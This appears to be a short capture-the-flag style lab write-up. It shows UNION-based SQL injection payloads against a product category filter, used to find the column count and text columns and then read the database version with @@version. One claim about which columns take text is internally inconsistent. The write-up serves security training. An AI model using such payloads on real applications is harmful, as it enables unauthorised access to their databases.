# Lab: SQL Injection - Database Version (MySQL & Microsoft)

## Lab Description
This lab contains a SQL injection vulnerability in the product category filter.  
The application returns query results in the response, allowing a **UNION attack**.

## Goal
Retrieve and display the **database version string**.

---

## Steps to Solve

1. Open the lab in your browser.

2. Intercept the request using **Burp Suite**.

3. In the application, click any product category.

4. In Burp → HTTP History:
   - Find the request with the `category` parameter.
   - Send it to **Repeater**.

---

## Step 1: Find Number of Columns

Inject payloads like:


'+UNION+SELECT+NULL--+
'+UNION+SELECT+NULL,NULL--+


Keep increasing `NULL` values until the query works without error.

In this lab → **2 columns**

---

## Step 2: Identify Text Columns

Test with:


'+UNION+SELECT+'abc','def'--+


If it works → both columns accept **text**
But in this lab only one column takes string data

---

## Step 3: Extract Database Version

Use payload:


'+UNION+SELECT+@@version,+NULL--+


---

## Result

- The database version string is displayed in the response.
- This confirms successful SQL injection.

---

## Explanation

- `UNION SELECT` allows combining attacker-controlled queries.
- `@@version` is used in **MySQL and Microsoft SQL Server** to fetch version info.
- Identifying column count and type is required before extraction.

---

## Key Payloads


'+UNION+SELECT+'abc','def'--+
'+UNION+SELECT+@@version,+NULL--+


---

## Conclusion

By exploiting the SQL injection in the category filter, we:
- Determined column count
- Verified data types
- Extracted the database version

Lab solved..
